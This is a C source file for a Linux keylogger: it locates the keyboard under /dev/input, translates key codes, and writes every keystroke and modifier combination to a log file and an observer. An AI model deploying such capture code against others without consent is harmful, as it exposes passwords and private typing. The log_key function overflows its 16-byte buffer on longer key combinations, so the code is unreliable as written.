#include "keylogger.h"

#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "behavior_subject.h"

#define KEY_MAP_SIZE 128

const KeyMap key_map[KEY_MAP_SIZE] = {
    [KEY_A] = {"a", "A"},
    [KEY_B] = {"b", "B"},
    [KEY_C] = {"c", "C"},
    [KEY_D] = {"d", "D"},
    [KEY_E] = {"e", "E"},
    [KEY_F] = {"f", "F"},
    [KEY_G] = {"g", "G"},
    [KEY_H] = {"h", "H"},
    [KEY_I] = {"i", "I"},
    [KEY_J] = {"j", "J"},
    [KEY_K] = {"k", "K"},
    [KEY_L] = {"l", "L"},
    [KEY_M] = {"m", "M"},
    [KEY_N] = {"n", "N"},
    [KEY_O] = {"o", "O"},
    [KEY_P] = {"p", "P"},
    [KEY_Q] = {"q", "Q"},
    [KEY_R] = {"r", "R"},
    [KEY_S] = {"s", "S"},
    [KEY_T] = {"t", "T"},
    [KEY_U] = {"u", "U"},
    [KEY_V] = {"v", "V"},
    [KEY_W] = {"w", "W"},
    [KEY_X] = {"x", "X"},
    [KEY_Y] = {"y", "Y"},
    [KEY_Z] = {"z", "Z"},
    [KEY_0] = {"0", ")"},
    [KEY_1] = {"1", "!"},
    [KEY_2] = {"2", "@"},
    [KEY_3] = {"3", "#"},
    [KEY_4] = {"4", "$"},
    [KEY_5] = {"5", "%"},
    [KEY_6] = {"6", "^"},
    [KEY_7] = {"7", "&"},
    [KEY_8] = {"8", "*"},
    [KEY_9] = {"9", "("},
    [KEY_SPACE] = {"Space", "Space"},
    [KEY_ENTER] = {"Enter", "Enter"},
    [KEY_BACKSPACE] = {"Backspace", "Backspace"},
    [KEY_TAB] = {"Tab", "Tab"},
    [KEY_ESC] = {"Esc", "Esc"},
    [KEY_COMMA] = {",", "<"},
    [KEY_DOT] = {".", ">"},
    [KEY_SLASH] = {"/", "?"},
    [KEY_SEMICOLON] = {";", ":"},
    [KEY_APOSTROPHE] = {"'", "\""},
    [KEY_LEFTBRACE] = {"[", "{"},
    [KEY_RIGHTBRACE] = {"]", "}"},
    [KEY_MINUS] = {"-", "_"},
    [KEY_EQUAL] = {"=", "+"},
    [KEY_GRAVE] = {"`", "~"},
    [KEY_BACKSLASH] = {"\\", "|"},
    [KEY_KPASTERISK] = {"*", "*"},
    [KEY_KPPLUS] = {"+", "+"},
    [KEY_KPMINUS] = {"-", "-"},
    [KEY_KPDOT] = {".", "."},
    [KEY_KP0] = {"KP_0", "KP_0"},
    [KEY_KP1] = {"KP_1", "KP_1"},
    [KEY_KP2] = {"KP_2", "KP_2"},
    [KEY_KP3] = {"KP_3", "KP_3"},
    [KEY_KP4] = {"KP_4", "KP_4"},
    [KEY_KP5] = {"KP_5", "KP_5"},
    [KEY_KP6] = {"KP_6", "KP_6"},
    [KEY_KP7] = {"KP_7", "KP_7"},
    [KEY_KP8] = {"KP_8", "KP_8"},
    [KEY_KP9] = {"KP_9", "KP_9"},
    [KEY_UP] = {"Arrow Up", "Arrow Up"},
    [KEY_DOWN] = {"Arrow Down", "Arrow Down"},
    [KEY_LEFT] = {"Arrow Left", "Arrow Left"},
    [KEY_RIGHT] = {"Arrow Right", "Arrow Right"},
    [KEY_HOME] = {"Home", "Home"},
    [KEY_DELETE] = {"Del", "Del"},
    // To detect upper and lower case letters combined with the shift key
    // Capslock key must be at the end
    [KEY_CAPSLOCK] = {"CapsLock", "CapsLock"},
};

const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active) {
    if (key_code >= 0 && (size_t)key_code < sizeof(key_map) / sizeof(key_map[0]) && key_map[key_code].normal != NULL) {
        if ((capslock_active && !shift_pressed) || (!capslock_active && shift_pressed)) {
            return key_map[key_code].shifted;
        }
        return key_map[key_code].normal;
    }
    return "UNKNOWN";
}

char *strdup_alloc(const char *s) {
    if (s == NULL) {
        return NULL;
    }
    size_t len = strlen(s) + 1;
    char *new_str = (char *)malloc(len);
    if (new_str == NULL) {
        return NULL;
    }
    memcpy(new_str, s, len);
    return new_str;
}

char *find_keyboard_device(const char *target_device_name) {
    if (target_device_name) {
        return strdup_alloc(target_device_name);
    }

    DIR *dir;
    struct dirent *ent;
    const char base_path[] = "/dev/input/";

    if ((dir = opendir(base_path)) == NULL) {
        perror("Cannot access /dev/input");
        return NULL;
    }

    char device_path[256];
    while ((ent = readdir(dir)) != NULL) {
        if (strncmp(ent->d_name, "event", 5) == 0) {
            snprintf(device_path, sizeof(device_path), "%s%s", base_path, ent->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                perror("Cannot open device");
                continue;
            }
            char name[BUFFER_SIZE] = "Unknown";
            if (ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name) >= 0) {
                for (int i = 0; name[i]; i++) {
                    name[i] = tolower(name[i]);
                }
                if (strstr(name, "keyboard")) {
                    closedir(dir);
                    close(fd);
                    return strdup_alloc(device_path);
                }
            }
            close(fd);
        }
    }

    closedir(dir);
    return NULL;
}

void log_key(FILE *fp, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pressed, bool alt_pressed,
             const char *key_name) {
    char combined_key[16];
    combined_key[0] = '\0';

    bool is_modifier = (strcmp(key_name, "Shift") == 0 || strcmp(key_name, "Ctrl") == 0 ||
                        strcmp(key_name, "Meta") == 0 || strcmp(key_name, "Alt") == 0);

    if (is_modifier) {
        next(subject, key_name);
        fprintf(fp, "%s\n", key_name);
    } else {
        if (ctrl_pressed) strcat(combined_key, "Ctrl+");
        if (meta_pressed) strcat(combined_key, "Meta+");
        if (alt_pressed) strcat(combined_key, "Alt+");
        strcat(combined_key, key_name);
        next(subject, combined_key);
        fprintf(fp, "%s\n", combined_key);
    }

    fflush(fp);
}
